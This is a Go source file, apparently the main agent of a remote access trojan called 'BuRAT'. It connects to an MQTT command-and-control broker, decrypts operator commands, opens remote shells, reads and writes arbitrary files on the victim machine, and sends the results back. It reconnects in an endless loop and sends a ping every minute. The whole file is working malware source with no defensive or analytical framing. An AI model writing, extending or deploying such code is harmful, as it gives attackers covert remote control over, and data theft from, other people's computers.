package main

import (
	"./burat"
	"./packets"

	"github.com/eclipse/paho.mqtt.golang"

	"fmt"
	"time"
	"strings"
)

func main() {
	burat := burat.NewBuRAT()

	burat.Internals().RSA.Config(`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----`)

	burat.AddTopics(map[string]string{
		"nil":										"bu/nil",
		"bushi":									"bu/bushi/BURAT",
		"remoteshell":						"bu/bushi/BURAT/bushido/remoteshell/+",
		"remoteshell_cmd_write":	"bu/bushi/BURAT/bushido/remoteshell/+/cmd/write",
		"remoteshell_evt_open":		"bu/bushi/BURAT/bushido/remoteshell/+/evt/open",
		"remoteshell_evt_close":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/close",
		"remoteshell_evt_read":		"bu/bushi/BURAT/bushido/remoteshell/+/evt/read",
		"remoteshell_evt_write":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
		"remoteshell_evt_error":	"bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
		"filerw":									"bu/bushi/BURAT/bushido/filerw/+",
		"filerw_cmd_open":				"bu/bushi/BURAT/bushido/filerw/+/cmd/open",
		"filerw_cmd_close":				"bu/bushi/BURAT/bushido/filerw/+/cmd/close",
		"filerw_cmd_read":				"bu/bushi/BURAT/bushido/filerw/+/cmd/read",
		"filerw_cmd_write":				"bu/bushi/BURAT/bushido/filerw/+/cmd/write",
		"filerw_evt_read":				"bu/bushi/BURAT/bushido/filerw/+/evt/read",
		"filerw_evt_write":				"bu/bushi/BURAT/bushido/filerw/+/evt/write",
		"filerw_evt_error":				"bu/bushi/BURAT/bushido/filerw/+/evt/error",
	})

	burat.AddTopicCallback("remoteshell", func (client mqtt.Client, message mqtt.Message) {
		if len(message.Payload()) != 0  {
			var packet packets.RemoteShellPacket
			burat.Decryse(message.Payload(), &packet)
			burat.Bushido().RemoteShell.Open(packet.Id, packet.Shell)
		} else {
			id := (strings.Split(message.Topic(), "/"))[5]
			remoteshells := burat.Bushido().RemoteShell.RemoteShells()
			for _, rs := range remoteshells {
				if burat.Internals().Digest.Digest(rs.Id()) == id {
					burat.Bushido().RemoteShell.Close(rs.Id())
				}
			}
		}
	})

	burat.AddTopicCallback("remoteshell_cmd_write", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.RemoteShellWritePacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().RemoteShell.Write(packet.Id, packet.Data)
	})

	burat.AddTopicCallback("filerw_cmd_open", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.FilerwOpenPacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().FileRW.Open(packet.Id, packet.Path)
	})

	burat.AddTopicCallback("filerw_cmd_close", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.FilerwClosePacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().FileRW.Close(packet.Id)
	})

	burat.AddTopicCallback("filerw_cmd_read", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.FilerwReadPacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().FileRW.Read(packet.Id, packet.Length, packet.Offset)
	})

	burat.AddTopicCallback("filerw_cmd_write", func (client mqtt.Client, message mqtt.Message) {
		var packet packets.FilerwWritePacket
		burat.Decryse(message.Payload(), &packet)
		burat.Bushido().FileRW.Write(packet.Id, packet.Data, packet.Offset)
	})

	burat.Bushido().RemoteShell.OnOpen(func (id string) {
		fmt.Println("remoteshell.open", id)
		packet := burat.Seen(packets.RemoteShellOnOpenPacket { Id: id })
		burat.Publish(id, "remoteshell_evt_open", 2, false, packet)
	})

	burat.Bushido().RemoteShell.OnClose(func (id string) {
		fmt.Println("remoteshell.close", id)
		packet := burat.Seen(packets.RemoteShellOnClosePacket { Id: id })
		burat.Publish(id, "remoteshell_evt_close", 2, false, packet)
	})

	burat.Bushido().RemoteShell.OnRead(func (id string, data string) {
		fmt.Println("remoteshell.read", id, data)
		packet := burat.Seen(packets.RemoteShellOnReadPacket { Id: id, Data: data })
		burat.Publish(id, "remoteshell_evt_read", 2, false, packet)
	})

	burat.Bushido().RemoteShell.OnWrite(func (id string, data string) {
		fmt.Println("remoteshell.write", id, data)
		packet := burat.Seen(packets.RemoteShellOnWritePacket { Id: id, Data: data })
		burat.Publish(id, "remoteshell_evt_write", 2, false, packet)
	})

	burat.Bushido().RemoteShell.OnError(func (id string, error error) {
		fmt.Println("remoteshell.error", id, error.Error())
		packet := burat.Seen(packets.RemoteShellOnErrorPacket { Id: id, Error: error.Error() })
		burat.Publish(id, "remoteshell_evt_error", 2, false, packet)
	})

	burat.Bushido().FileRW.OnOpen(func (id string) {
		fmt.Println("filerw.open", id)
		files := burat.Bushido().FileRW.Files()
		for _, f := range files {
			if f.Id() == id {
				packet := burat.Seen(packets.FilerwOnOpenPacket {
					Id: id,
					Path: f.Path(),
				})
				burat.Publish(id, "filerw", 2, true, packet)
			}
		}
	})

	burat.Bushido().FileRW.OnClose(func (id string) {
		fmt.Println("filerw.close", id)
		burat.Publish(id, "filerw", 2, true, nil)
	})

	burat.Bushido().FileRW.OnRead(func (id string, data []byte, offset int) {
		fmt.Println("filerw.read", id, data)
		packet := burat.Seen(packets.FilerwOnReadPacket { Id: id, Data: data, Offset: offset })
		burat.Publish(id, "filerw_evt_read", 2, false, packet)
	})

	burat.Bushido().FileRW.OnWrite(func (id string, length int, offset int) {
		fmt.Println("filerw.write", id, length)
		packet := burat.Seen(packets.FilerwOnWritePacket { Id: id, Length: length, Offset: offset })
		burat.Publish(id, "filerw_evt_write", 2, false, packet)
	})

	burat.Bushido().FileRW.OnError(func (id string, error error) {
		fmt.Println("filerw.error", id, error.Error())
		packet := burat.Seen(packets.FilerwOnErrorPacket { Id: id, Error: error.Error() })
		burat.Publish(id, "filerw_evt_error", 2, false, packet)
	})

	lastPingTime := time.Now()
	for {
		if burat.Internals().Mqtt.IsConnectionOpen() {
			if time.Since(lastPingTime).Seconds() >= 60 {
				burat.Ping()
				lastPingTime = time.Now()
			}
		} else {
			if !burat.Connecting() {
				burat.Connect()
			}
		}
	}
}
